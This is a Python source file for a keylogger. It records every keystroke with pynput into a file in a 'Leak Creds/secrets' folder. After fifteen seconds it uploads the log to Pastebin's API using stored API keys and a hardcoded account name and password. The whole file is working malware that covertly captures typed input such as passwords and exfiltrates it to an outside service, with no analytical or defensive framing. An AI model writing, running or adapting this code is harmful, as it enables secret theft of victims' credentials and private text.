import requests
import os
import time
import threading
from pynput import keyboard

# Define the log file path
LOG_FILE = os.path.join("Leak Creds", "secrets", "keylog.txt")

def on_press(key):
    """Handle key press events and log them to a file."""
    try:
        with open(LOG_FILE, 'a') as file:
            if hasattr(key, 'char') and key.char:
                file.write(key.char)
            else:
                special_keys = {
                    keyboard.Key.space: "[space]",
                    keyboard.Key.enter: "[enter]",
                    keyboard.Key.tab: "[tab]",
                    keyboard.Key.shift: "[shift]",
                    keyboard.Key.ctrl: "[ctrl]",
                    keyboard.Key.alt: "[alt]",
                    keyboard.Key.esc: "[esc]",
                    keyboard.Key.delete: "[delete]",
                    keyboard.Key.up: "[up]",
                    keyboard.Key.down: "[down]",
                    keyboard.Key.left: "[left]",
                    keyboard.Key.right: "[right]"
                }
                file.write(special_keys.get(key, f"[{key}]"))
    except Exception as e:
        print(f"[-] Failed to log key press: {e}")

def on_release(key):
    """Handle key release events."""
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    """Start the keylogger."""
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()

def time_limit_check(duration):
    """Check if the time limit is reached and exit the program."""
    start = time.time()
    while True:
        if time.time() > start + duration:
            print("Time elapsed, sending data to Pastebin...")
            send_to_pastebin()
            os._exit(0)
        time.sleep(1)

def send_to_pastebin():
    """Send logged data to Pastebin."""
    try:
        # Read the dev key
        with open(os.path.join("Leak Creds", "secrets", "dev_key"), 'r') as f:
            key = f.read().strip()
    except FileNotFoundError:
        print("Dev key not found")
        return

    try:
        # Read the user key
        with open(os.path.join("Leak Creds", "secrets", "user_key"), 'r') as f:
            user_key = f.read().strip()
    except FileNotFoundError:
        print("User key not found")
        return

    try:
        # Read the contents of the log file
        with open(LOG_FILE, 'r') as file:
            file_contents = file.read()

        login_data = {
            'api_dev_key': key,
            'api_user_name': 'payload_paradise',
            'api_user_password': 'JDSG874Y834GYDSLHIVNZ',
            'api_option': 'paste',
            'api_paste_code': file_contents,
            'api_paste_name': "keylog_data",
            'api_paste_expire_date': '10M',
            'api_user_key': user_key,
            'api_paste_format': 'gettext'
        }

        r = requests.post("https://pastebin.com/api/api_post.php", data=login_data)
        print("Paste status:", r.status_code if r.status_code != 200 else "OK/200")
        print("Paste URL:", r.text)

    except Exception as e:
        print(f"Error sending data to Pastebin: {e}")

if __name__ == "__main__":
    duration = 15  # Define seconds
    
    # Create log file if it doesn't exist
    with open(LOG_FILE, 'w') as f:
        pass
        
    keylogger_thread = threading.Thread(target=start_keylogger)
    timer_thread = threading.Thread(target=time_limit_check, args=(duration,))

    keylogger_thread.start()
    timer_thread.start()

    keylogger_thread.join()
    timer_thread.join()

